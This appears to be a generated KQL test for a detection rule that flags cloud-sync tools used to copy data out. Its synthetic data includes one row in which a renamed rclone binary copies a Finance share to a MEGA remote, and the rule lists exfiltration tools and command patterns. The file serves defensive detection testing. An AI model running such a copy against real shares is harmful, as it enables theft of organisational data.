// Test: data-exfiltration-tool
// Rule: Cloud sync tool used to copy data out (rclone, MEGA, restic) (detections/data-exfiltration-tool.yaml)
// A renamed rclone copying to MEGA fires and is marked renamed; rclone version and robocopy don't.
// Generated by tools/build_tests.py from tests/cases/data-exfiltration-tool.yaml. Do not edit by hand.
let DeviceProcessEvents = datatable(AgoSeconds:long, DeviceName:string, AccountName:string, FileName:string, FolderPath:string, ProcessCommandLine:string, ProcessVersionInfoOriginalFileName:string, SHA256:string, InitiatingProcessFileName:string, InitiatingProcessCommandLine:string, InitiatingProcessParentFileName:string) [
    600, "fs01", "mallory", "svchost64.exe", "C:\\ProgramData\\svchost64.exe", "svchost64.exe copy \\\\fs01\\Finance mega:bk --transfers 16 --config C:\\ProgramData\\r.conf", "rclone.exe", "", "cmd.exe", "", "",
    600, "it-ws-01", "alice", "rclone.exe", "C:\\Tools\\rclone.exe", "rclone.exe version", "rclone.exe", "", "cmd.exe", "", "",
    600, "fs02", "backup", "robocopy.exe", "C:\\Windows\\System32\\robocopy.exe", "robocopy.exe D:\\Shares \\\\nas\\backup /MIR", "robocopy.exe", "", "cmd.exe", "", ""
]
| extend TimeGenerated = now() - AgoSeconds * 1s
| project-away AgoSeconds;
let RuleResults = () {
DeviceProcessEvents
| where TimeGenerated > ago(1h)
| extend IsRclone = FileName in~ ("rclone.exe", "rclone") or ProcessVersionInfoOriginalFileName =~ "rclone.exe"
| where (IsRclone and ProcessCommandLine matches regex @"(?i)\s(copy|sync|move|copyto|moveto)\s")
    or ProcessCommandLine matches regex @"(?i)\s(copy|sync)\s.*\s[\w\-]+:\S*.*--(transfers|multi-thread-streams|no-check-certificate|ignore-existing|max-age)"
    or FileName in~ ("megacmd.exe", "megacmdserver.exe", "mega-put.exe", "megasync.exe", "restic.exe", "restic")
| extend Renamed = IsRclone and FileName !in~ ("rclone.exe", "rclone")
| project TimeGenerated, DeviceName, AccountName, FileName, Renamed, ProcessCommandLine, FolderPath, InitiatingProcessFileName
};
RuleResults()
| summarize Rows = count(), Include1 = countif(tostring(DeviceName) == "fs01" and tobool(Renamed) == true), Exclude1 = countif(tostring(DeviceName) == "it-ws-01"), Exclude2 = countif(tostring(DeviceName) == "fs02")
| extend Test = "data-exfiltration-tool", Expected = "1 row(s); 1 must appear; 2 must not"
| extend Result = iff(Rows == 1 and Include1 >= 1 and Exclude1 == 0 and Exclude2 == 0, "PASS", "FAIL")
| project Test, Result, Rows, Expected
